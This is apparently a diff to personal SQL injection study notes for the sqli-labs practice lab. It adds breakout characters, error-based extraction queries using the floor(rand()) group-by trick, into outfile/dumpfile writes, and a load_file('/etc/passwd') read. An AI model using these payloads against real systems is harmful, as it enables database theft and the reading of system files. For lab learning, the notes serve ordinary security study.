@@ -42,15 +42,67 @@ http://lab.in/sqli/Less-9/?id=1' and sleep(2) and substring(database(),1,1)="s" 
 
 version() database() user() current_user 
 ***************************************************************
-show databases;
-use information_schema;
-show tables;
-desc tables;
-select count(*) from information_schema.tables ;
-select count(*) from information_schema.columns ;
+[Parameter]
+ ‘ " \ / . ) ”) ’) #
+' -- -   (SQL comment)
+-- -
+')-- -
+“)-- -
+# (SQL Comment)
+
+[Advanced Functions]
+ISNULL		BIN	          SYSTEM_USER
+BINARY		CONV		     IFNULL
+CASE		     CONVERT		CONNECTION_ID
+CAST		     NULLIF	     LAST_INSERT_ID
+COALESCE	     DATABASE	     CURRENT_USER
+VERSION	     USER	          SESSION_USER
+
+(SQL injection attempt) https://en.wikipedia.org/wiki/ASCII
+0x7E is ~
+0x27 is '
+0x20 is a space character
+0x3A is :  
+version() database() user() current_user 
+**********************************************************************************************************
+# show databases;          
+# use information_schema;       
+# show tables;        
+# desc tables;
+# select count(*) from information_schema.tables ;
+# select count(*) from information_schema.columns ;
 # select table_name from information_schema,tables where table_schema='security';
 # select table_name,column_name from information_schema.tables where table_schema="security";
 # select table_name,column_name from information_schema.columns where table_schema="security";
+
+(Error Based)
+0x7E is ~      0x27 is '      0x20 is a space character     0x3A is :
+# select concat((select database()));
+# select concat(0x3a,0x3a,(select database()),0x3a,0x3a);
+# select concat(0x3a,0x3a,(select database()),0x3a,0x3a)a;     {will print like 'a'}
+# select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns;
+# select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables;
+# select concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a;
+
+# select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))a from information_schema.tables group by a;
+# select count(*),concat(0x3a,0x3a,(select version()),0x3a,0x3a, floor(rand()*2))a from information_schema.tables group by a;
+# select count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a;
+
+(Outfile String)
+[Only one row output write into a file]
+# select * from users limit 0,1 into dumpfile "/tmp/t2.txt";
+
+[More than one Row write into a file]
+# select * from users limit 2,5 into outfile "/tmp/t.txt";
+
+[Load texts from files]
+# select load_file("/etc/passwd");
+
+https://www.w3schools.com/sql/func_mysql_concat_ws.asp
+The CONCAT_WS() function adds two or more expressions together with a separator.
+Syntax
+# SELECT CONCAT_WS("-", "SQL", "Tutorial", "is", "fun!") AS ConcatenatedString;
+ result ⇒ SQL-Tutorial-is-fun!
 
 select * from information_schema.columns limit 0,5;
 ********************************************************************************************************************
